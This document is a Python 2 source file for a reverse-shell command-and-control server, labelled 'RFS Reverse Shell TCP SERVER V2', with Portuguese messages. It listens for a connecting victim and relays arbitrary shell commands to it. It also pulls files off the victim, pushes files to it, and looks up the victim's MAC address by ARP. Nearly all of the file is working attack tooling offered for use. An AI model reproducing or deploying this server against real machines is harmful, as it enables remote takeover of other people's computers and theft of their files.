import socket,os,sys,threading
from scapy.all import *
def banner():
   print('#######################################################################################################\n\n')
   print('RFS Reverse Shell TCP SERVER V2')
   print('#######################################################################################################\n')
   
def download(conn,command):
    conn.send(command)
    f = open('server_file.py','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print ('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print ('[+] Download Completo ')
            f.close()
            break
        f.write(bits)

def Cat(conn,command):
    conn.send(command)
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            break
        if bits.endswith('DONE'):
            break
        print(bits)
       
def mandaArq(s,path):
 try:
    pat = path[7:]
    caminho = str(os.getcwd())+'//'+pat
    if os.path.exists(caminho):
        print('Enviando arquivo %s ...'%pat)
        s.send('upload %s'%pat)
        f = open(caminho, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        print(s.recv(1024))  
 except Exception as e:
     print('[-] Arquivo %s nao encontrado, erro:\n %s '%(pat,e))


def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None


def connect():
    try:
     ip = ''
     port = int(raw_input('[+]PORT: '))
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(1)
     print('[+]127.0.0.1 Listening at port: '+str(port))
     conn,addr = s.accept()
     print('[+]Connected %s at port %s '%(addr[0],addr[1]))

     while True:
        command = str(raw_input("CMD# > ")).rstrip()
        
        if 'quit' in command:
           print('[-]Conexao encerrada ... ')
           conn.send('quit')
           conn.close()
           break

        elif 'download' in command:
           download(conn,command)

        elif 'cat' in command:
           Cat(conn,command)
           
        elif 'getMac' in command:
           mac = get_mac(addr[0])
           print('[+]Endereco MAC do ip %s => %s'%(addr[0],mac))

        elif 'upload' in command:
           mandaArq(conn,command)
           
        else:
           conn.send(command)
           resposta = conn.recv(4096)
           print(resposta)
           
    except Exception as e:
        print('[Server]Erro ao se conectar... \n [-]Erro: %s'%str(e))

def main():  
    client_handler = threading.Thread(target=connect,args=())
    client_handler.start()

try:
    banner()
    main()
except:
    print('[-]Erro ao abrir o server')
    main()
    
